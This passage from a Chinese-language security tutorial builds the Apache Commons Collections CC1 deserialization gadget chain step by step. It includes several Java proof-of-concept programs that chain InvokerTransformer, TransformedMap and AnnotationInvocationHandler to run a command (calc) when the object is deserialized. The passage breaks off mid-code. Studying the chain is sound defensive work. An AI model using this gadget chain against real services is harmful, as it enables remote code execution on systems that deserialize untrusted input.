*/</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到，CC1链的终点是InvokerTransformer.transform方法，来到collections源码开始审计</p>
<p>发现transform方法的源头在Transformer接口</p>
<img src="/image/image-20230806141524789.png" alt="image-20230806141524789" style="zoom:80%;" />

<p>从名字我们可以看出这个接口是用于类型转换的，在开发中比较常用，我们往下寻找实现了这个接口并且同时实现了反序列化接口的类</p>
<img src="/image/image-20230808142318172.png" alt="image-20230808142318172" style="zoom:80%;" />

<p>我们在其中找到了InvokerTransformer类，可以看到他也实现了Serializable接口</p>
<img src="/image/image-20230808142414013.png" alt="image-20230808142414013" style="zoom:80%;" />

<p>我们往下观察一下他的构造器，以及重写的transform方法</p>
<p>构造器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor for no arg instance.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  the method to call</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = <span class="literal">null</span>;</span><br><span class="line">    iArgs = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  the method to call</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  the constructor parameter types, not cloned</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  the constructor arguments, not cloned</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transform方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中第二种有参构造器，接受了三个参数即：参数为方法名，所调用方法的参数类型，所调用方法的参数值</p>
<p>接着我们看一下transform方法</p>
<img src="/image/image-20230808143224000.png" alt="image-20230808143224000" style="zoom:80%;" />

<p>其中传入的input对象，相当于一个反射执行方法，结合构造器来看，这里的参数都是可控的，我们就可以通过这个来调用任意类的任意方法，这里以Runtime类为例</p>
<p><strong>TestInvokerTransformer.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInvokerTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230808152044244.png" alt="image-20230808152044244" style="zoom:80%;" />

<p>相当于替我们执行了反射过程，接下来我们需要找一个重写了readObject，且实现了transform方法的子类</p>
<p>直接查找用法，发现了很多调用了transform的方法，我们关注TransformedMap类下的checkSetValue方法</p>
<img src="/image/image-20230808153836848.png" alt="image-20230808153836848" style="zoom:80%;" />

<img src="/image/image-20230808153850126.png" alt="image-20230808153850126" style="zoom:80%;" />

<p>接下来找到构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;</span></span><br><span class="line"><span class="comment">    * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment">    * are NOT transformed.</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">       <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里的构造器和checkSetValue方法都是protected权限，所以我们要找到一个内部实例化的方法</p>
<img src="/image/image-20230808160113377.png" alt="image-20230808160113377" style="zoom:80%;" />

<p>找到一个public类型的decorate方法，且三个参数均为可控，而反观checkSetValue方法调用的是valueTransformer的transform方法</p>
<p>因此我们需要先调用这个方法实例化TransformedMap类，传入我们自定义的transformer（即invokerTransformer），再想办法调用checkSetValue方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//调用public方法decorate实例化</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>接下来找找哪里调用了checkSetValue方法，直接查找用法</p>
<img src="/image/image-20230808162230592.png" alt="image-20230808162230592" style="zoom:80%;" />

<p>我们发现只有一个地方调用了，跟进AbstractInputCheckedMapDecorator类的setValue方法</p>
<img src="/image/image-20230808162448360.png" alt="image-20230808162448360" style="zoom:80%;" />

<p>这里的MapEntry定义的其实是AbstractMapEntryDecorator的子类</p>
<p>entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法</p>
<img src="/image/image-20230808163317191.png" alt="image-20230808163317191" style="zoom:80%;" />

<p>上面子类的setValue其实是重写的父类的setValue方法，我们来看一下AbstractMapEntryDecorator类</p>
<img src="/image/image-20230808165128149.png" alt="image-20230808165128149" style="zoom: 67%;" />

<p>而这个类又引入了Map.Entry接口，我们只需要进行Map遍历，就可以调用setValue方法，从而调用checkSetValue方法</p>
<p>恰好TransformedMap对象又是Map类型，因此我们只需要遍历TransformedMap对象即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//首先通过put方法推一个键值对进去，才能进行遍历</span></span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//调用public方法decorate实例化</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历Map的常用格式</span></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Object, Object&gt; entry:transformedMap.entrySet())&#123;</span><br><span class="line">            <span class="comment">//通过setValue方法传入Runtime对象</span></span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230808180443968.png" alt="image-20230808180443968" style="zoom:80%;" />

<img src="/image/image-20230808183422154.png" alt="image-20230808183422154" style="zoom:80%;" />

<p>成功执行，但是这里并没有用到readObject方法，因此我们需要找到一个readObject方法，可以遍历Map，并且调用这个setValue方法</p>
<p>我们继续查找setValue的用法，最后在AnnotationInvocationHandler类中找到了一个调用了setValue的readObject方法，同时还能代替Map的遍历过程</p>
<img src="/image/image-20230808231340719.png" alt="image-20230808231340719" style="zoom:80%;" />

<p>因为readObject是private，所以接下来我们找到这个类的构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类</span></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中memberValues是可控的，我们可以传入自己的需要的类，然后实现setValue方法</p>
<img src="/image/image-20230808233435346.png" alt="image-20230808233435346" style="zoom:80%;" />

<p>但是我们可以看到，这个类并不是public声明，所以只能在包内被调用，因此我们需要通过反射来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//首先通过put方法推一个键值对进去，才能进行遍历</span></span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//调用public方法decorate实例化</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        //遍历Map的常用格式</span></span><br><span class="line"><span class="comment">//        for(Map.Entry&lt;Object, Object&gt; entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//            //通过setValue方法传入Runtime对象</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(object);</span><br><span class="line">        unserialize(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\CC1&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后发现并没有弹计算器，我们打开序列化后的数据，发现找不到最重要的Runtime类</p>
<img src="/image/image-20230809001632001.png" alt="image-20230809001632001" style="zoom:80%;" />

<p>跟进到Runtime类，发现并没有实现序列化接口，因此不能被序列化</p>
<img src="/image/image-20230809002128957.png" alt="image-20230809002128957" style="zoom:80%;" />

<p>但是原型类实现了序列化接口，我们可以通过获取Runtime的原型类进行反射</p>
<img src="/image/image-20230809003308828.png" alt="image-20230809003308828" style="zoom:80%;" />

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> rt.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> rt.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>我们之前提到过invokerTransformr类的transform方法可以代替反射操作，我们用transform改写一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用transform方法改写</span></span><br><span class="line"><span class="comment">//获取getRuntime方法,首先获取Class原型类的getDeclaredMethod方法，然后定义传入参数类型，最后传入两个参数</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;getDeclaredMethod&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;</span><br><span class="line">).transform(rt);</span><br><span class="line"><span class="comment">//获取Runtime对象,首先获取invoke方法，定义参数类型，最后两个null</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;</span><br><span class="line">).transform(getRuntime);</span><br><span class="line"><span class="comment">//反射执行exec方法</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">).transform(runtime);</span><br></pre></td></tr></table></figure>

<p>可以看到一共嵌套了三层，我们直接使用cc库中自带的链式transformer类ChainedTransformer</p>
<img src="/image/image-20230810204718705.png" alt="image-20230810204718705" style="zoom:80%;" />

<p>我们使用ChainedTransformer进行改写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用ChainedTransformer改写</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chainedTransformer.transform(rt);</span><br></pre></td></tr></table></figure>

<p>自此我们实现了通过Runtime原型类反射执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line">        <span class="comment">//Runtime runtime = Runtime.getRuntime();</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span 